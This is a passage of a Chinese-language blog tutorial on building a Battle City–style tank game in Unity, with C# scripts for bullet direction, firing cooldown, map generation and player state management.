src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3//image-20211006120315415.png"></p><h3 id="子弹方向的问题解决"><a href="#子弹方向的问题解决" class="headerlink" title="子弹方向的问题解决"></a>子弹方向的问题解决</h3><p>因为Unity2D是左手坐标系，也就是说Z轴是从前到后的，所以说向左旋转是Vector3(0, 0, -90)。向右则相反。</p><p>上下则很简明，向下就是(±180°)都可以。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Vector3 BulletEulerAngles;  <span class="comment">//定义子弹的欧拉角</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 子弹的角度应为：当前坦克的角度 + 子弹应该旋转的角度</span></span><br><span class="line">Instantiate(BulletPrefab, transform.position, Quaternion.Euler(transform.eulerAngles + BulletEulerAngles));</span><br></pre></td></tr></table></figure><p>把更改子弹的旋转角的位置放到坦克移动那里，也就是说，坦克朝哪个方向移动，子弹就往哪个方向射出。此处举出一例</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (x &gt; <span class="number">0</span>) <span class="comment">//向右</span></span><br><span class="line">&#123;</span><br><span class="line">    spriteRenderer.sprite = tankSprite[<span class="number">1</span>];</span><br><span class="line">    BulletEulerAngles = <span class="keyword">new</span> Vector3(<span class="number">0</span>, <span class="number">0</span>, <span class="number">90</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">0</span>) <span class="comment">//向左</span></span><br><span class="line">&#123;</span><br><span class="line">    spriteRenderer.sprite = tankSprite[<span class="number">3</span>];</span><br><span class="line">    BulletEulerAngles = <span class="keyword">new</span> Vector3(<span class="number">0</span>, <span class="number">0</span>, <span class="number">-90</span>); <span class="comment">//Z轴旋转-90°</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里的正负90度也是涉及到了左手坐标系的问题，这里就不再写了。</p><h3 id="左手坐标系问题再解决"><a href="#左手坐标系问题再解决" class="headerlink" title="左手坐标系问题再解决"></a>左手坐标系问题再解决</h3><p>老师的那里的问题，我这还是标准的右手坐标系啊，所以我这里的旋转的角度还是顺时针旋转的，所以这里我的向右的方向的v3的坐标应该是(0,0,90)</p><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3//image-20211006123946482.png"></p><h2 id="让子弹动起来"><a href="#让子弹动起来" class="headerlink" title="让子弹动起来"></a>让子弹动起来</h2><blockquote><p>目标：就是给子弹添加脚本，让子弹可以动起来。</p></blockquote><p>先给子弹添加脚本。</p><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3//image-20211006125634280.png"></p><h2 id="给子弹添加时间间隔"><a href="#给子弹添加时间间隔" class="headerlink" title="给子弹添加时间间隔"></a>给子弹添加时间间隔</h2><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">float</span> timeVal;  <span class="comment">//创建计时器，控制子弹的发射速度</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (timeVal &gt;= <span class="number">0.4f</span>)  <span class="comment">//设置子弹的CD为0.4</span></span><br><span class="line">    &#123;</span><br><span class="line">        Attack();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        timeVal += Time.deltaTime;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     坦克的攻击方法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Attack</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.Space))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 子弹的角度应为：当前坦克的角度 + 子弹应该旋转的角度</span></span><br><span class="line">        Instantiate(BulletPrefab, transform.position, Quaternion.Euler(transform.eulerAngles + BulletEulerAngles));</span><br><span class="line"></span><br><span class="line">        timeVal = <span class="number">0</span>; <span class="comment">//攻击后计时器清零</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="给子弹添加触发器"><a href="#给子弹添加触发器" class="headerlink" title="给子弹添加触发器"></a>给子弹添加触发器</h2><blockquote><p>触发器生效的前提条件是他们的渲染层级相同，渲染层级就是我们前面改过的layer的属性。</p></blockquote><p>先创建碰撞器，碰撞器里面有一个触发器的属性，给他勾上就ok了。言如下图</p><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3//image-20211006131028155.png"></p><h3 id="运动的一方-子弹-添加刚体属性"><a href="#运动的一方-子弹-添加刚体属性" class="headerlink" title="运动的一方(子弹)添加刚体属性"></a>运动的一方(子弹)添加刚体属性</h3><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3//image-20211006131155243.png"></p><h3 id="标签的添加"><a href="#标签的添加" class="headerlink" title="标签的添加"></a>标签的添加</h3><p>如下图，添加标签</p><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3//image-20211006132752386.png"></p><h3 id="制作空气墙"><a href="#制作空气墙" class="headerlink" title="制作空气墙"></a>制作空气墙</h3><p>就是边界问题，当子弹到达边界时自动销毁子弹</p><p>空气墙就是把那个障碍物复制一份(Ctrl + D)，然后移除他的精灵渲染器即可(sprite renderer).</p><h2 id="坦克的死亡问题"><a href="#坦克的死亡问题" class="headerlink" title="坦克的死亡问题"></a>坦克的死亡问题</h2><p>坦克如何死亡呢？在player.cs里面添加Die()方法，先整爆炸特效，死亡就是销毁当前的gameobject就行了</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//死亡</span></span><br><span class="line">Destroy(gameObject);</span><br></pre></td></tr></table></figure><p>现在看爆炸特效的消失，给爆炸特效添加脚本即可，脚本内容如下</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Explosion</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Start is called before the first frame update</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Destroy(gameObject, <span class="number">0.167f</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update is called once per frame</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="地图的实例化"><a href="#地图的实例化" class="headerlink" title="地图的实例化"></a>地图的实例化</h2><blockquote><p>目标：把整个地图的场景搭建起来。</p></blockquote><p>调地图大小的时候把相机改为正交模式即可更改Size，具体的操作流程<a href="https://blog.csdn.net/qq_41807260/article/details/87350003">如下链接</a>。</p><p>我这里的地图的纵向长大概为(16)，横向长大概为(24)。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MapCreator</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//用来装饰地图初始化所需物体的数组</span></span><br><span class="line">    <span class="comment">//0.老家 1.墙 2.障碍 3.出生效果 4.河流 5.草 6.空气墙</span></span><br><span class="line">    <span class="keyword">public</span> GameObject[] Items;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//已经有东西的位置的列表</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Vector3&gt; itemPositionList = <span class="keyword">new</span> List&lt;Vector3&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//地图实例化</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Awake</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//实例化老家</span></span><br><span class="line">        CreateItem(Items[<span class="number">0</span>], <span class="keyword">new</span> Vector3(<span class="number">0</span>, <span class="number">-8</span>, <span class="number">0</span>), Quaternion.identity);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用墙把家围起来</span></span><br><span class="line">        CreateItem(Items[<span class="number">1</span>], <span class="keyword">new</span> Vector3(<span class="number">-1</span>, <span class="number">-8</span>, <span class="number">0</span>), Quaternion.identity);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            CreateItem(Items[<span class="number">1</span>], <span class="keyword">new</span> Vector3(i<span class="number">-1</span>, <span class="number">-7</span>, <span class="number">0</span>), Quaternion.identity);</span><br><span class="line">        &#125;</span><br><span class="line">        CreateItem(Items[<span class="number">1</span>], <span class="keyword">new</span> Vector3(<span class="number">1</span>, <span class="number">-8</span>, <span class="number">0</span>), Quaternion.identity);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化外围空气墙,</span></span><br><span class="line">        <span class="comment">//上下</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">float</span> i = <span class="number">-12</span>; i &lt; <span class="number">13</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            CreateItem(Items[<span class="number">6</span>], <span class="keyword">new</span> Vector3(i, <span class="number">9</span>, <span class="number">0</span>), Quaternion.identity);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">float</span> i = <span class="number">-12</span>; i &lt; <span class="number">13</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            CreateItem(Items[<span class="number">6</span>], <span class="keyword">new</span> Vector3(i, <span class="number">-9</span>, <span class="number">0</span>), Quaternion.identity);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//左右</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">float</span> i = <span class="number">-8</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            CreateItem(Items[<span class="number">6</span>], <span class="keyword">new</span> Vector3(<span class="number">13</span>, i, <span class="number">0</span>), Quaternion.identity);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">float</span> i = <span class="number">-8</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            CreateItem(Items[<span class="number">6</span>], <span class="keyword">new</span> Vector3(<span class="number">-13</span>, i, <span class="number">0</span>), Quaternion.identity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化地图</span></span><br><span class="line">        <span class="comment">//1.墙</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">60</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            CreateItem(Items[<span class="number">1</span>], CreateRandomPosition(), Quaternion.identity);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.障碍</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            CreateItem(Items[<span class="number">2</span>], CreateRandomPosition(), Quaternion.identity);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//4.河流</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            CreateItem(Items[<span class="number">4</span>], CreateRandomPosition(), Quaternion.identity);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//5.草</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            CreateItem(Items[<span class="number">5</span>], CreateRandomPosition(), Quaternion.identity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化玩家</span></span><br><span class="line">        GameObject born = Instantiate(Items[<span class="number">3</span>], <span class="keyword">new</span> Vector3(<span class="number">-2</span>, <span class="number">-8.25f</span>, <span class="number">0</span>), Quaternion.identity);</span><br><span class="line">        born.GetComponent&lt;Born&gt;().createPlayer = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化敌人</span></span><br><span class="line">        CreateItem(Items[<span class="number">3</span>], <span class="keyword">new</span> Vector3(<span class="number">-12</span>, <span class="number">8</span>, <span class="number">0</span>), Quaternion.identity);</span><br><span class="line">        CreateItem(Items[<span class="number">3</span>], <span class="keyword">new</span> Vector3(<span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>), Quaternion.identity);</span><br><span class="line">        CreateItem(Items[<span class="number">3</span>], <span class="keyword">new</span> Vector3(<span class="number">12</span>, <span class="number">8</span>, <span class="number">0</span>), Quaternion.identity);</span><br><span class="line"></span><br><span class="line">        InvokeRepeating(<span class="string">&quot;createEnemy&quot;</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CreateItem</span>(<span class="params">GameObject item, Vector3 itemPosition, Quaternion itemRotation</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        GameObject itemGo = Instantiate(item, itemPosition, itemRotation);</span><br><span class="line">        itemGo.transform.SetParent(gameObject.transform);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成的位置保存一下</span></span><br><span class="line">        itemPositionList.Add(itemPosition);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断位置是否已经生成过item</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//产生随机位置的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Vector3 <span class="title">CreateRandomPosition</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//最外圈的地方不产生物品</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Vector3 createPosition = <span class="keyword">new</span> Vector3(Random.Range(<span class="number">-11</span>, <span class="number">12</span>), Random.Range(<span class="number">-7</span>, <span class="number">8</span>), <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (!HasItem(createPosition))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> createPosition;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断位置是否已经实例化物品的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="built_in">bool</span> <span class="title">HasItem</span>(<span class="params">Vector3 createPosition</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> item <span class="keyword">in</span> itemPositionList)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (createPosition == item)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//产生敌人的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">createEnemy</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span> num = Random.Range(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        Vector3 EnemyPosition = <span class="keyword">new</span> Vector3();</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            EnemyPosition = <span class="keyword">new</span> Vector3(<span class="number">-12</span>, <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (num == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            EnemyPosition = <span class="keyword">new</span> Vector3(<span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            EnemyPosition = <span class="keyword">new</span> Vector3(<span class="number">12</span>, <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        CreateItem(Items[<span class="number">3</span>], EnemyPosition, Quaternion.identity);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="玩家状态管理"><a href="#玩家状态管理" class="headerlink" title="玩家状态管理"></a>玩家状态管理</h2><p>脚本实现对玩家状态的一个管理</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.UI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PlayerManager</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//玩家的生命</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> playerLife = <span class="number">3</span>;</span><br><span class="line">    <span class="comment">//玩家的得分</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> playerScore = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//玩家是否死亡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> isDead;</span><br><span class="line">    <span class="comment">//游戏是否失败</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> isDefeat = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">//出生特效的引用</span></span><br><span class="line">    <span class="keyword">public</span> GameObject reLivePrefab;</span><br><span class="line">    <span class="comment">//两个ui得引用</span></span><br><span class="line">    <span class="keyword">public</span> Text playerScoreText;</span><br><span class="line">    <span class="keyword">public</span> Text playerLifeText;</span><br><span class="line">    <span class="comment">//拿到失败的图片</span></span><br><span class="line">    <span class="keyword">public</span> GameObject imgGameOver;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> PlayerManager instance;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PlayerManager Instance &#123; <span class="keyword">get</span> =&gt; instance; <span class="keyword">set</span> =&gt; instance = <span class="keyword">value</span>; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Awake</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        instance = <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Start is called before the first frame update</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update is called once per frame</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//游戏结束</span></span><br><span class="line">        <span class="keyword">if</span> (isDefeat)</span><br><span class="line">        &#123;</span><br><span class="line">            imgGameOver.SetActive(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isDead)</span><br><span class="line">        &#123;</span><br><span class="line">            reLive();</span><br><span class="line">        &#125;</span><br><span class="line">        playerLifeText.text = playerScore.ToString();</span><br><span class="line">        playerLifeText.text = playerLife.ToString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//复活</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reLive</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (playerLife == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//没命了，回到主界面</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            GameObject born = Instantiate(reLivePrefab, <span class="keyword">new</span> Vector3(<span class="number">-2</span>, <span class="number">-8.25f</span>, <span class="number">0</span>), Quaternion.identity);</span><br><span class="line">            born.GetComponent&lt;Born&gt;().createPlayer = <span class="literal">true</span>;</span><br><span class="line">            isDead = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="制作开始界面，第一个场景"><a href="#制作开始界面，第一个场景" class="headerlink" title="制作开始界面，第一个场景"></a>制作开始界面，第一个场景</h2><p>直接先创建start scene。</p><p>然后直接拉ui，但是这里的选项有个脚本。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 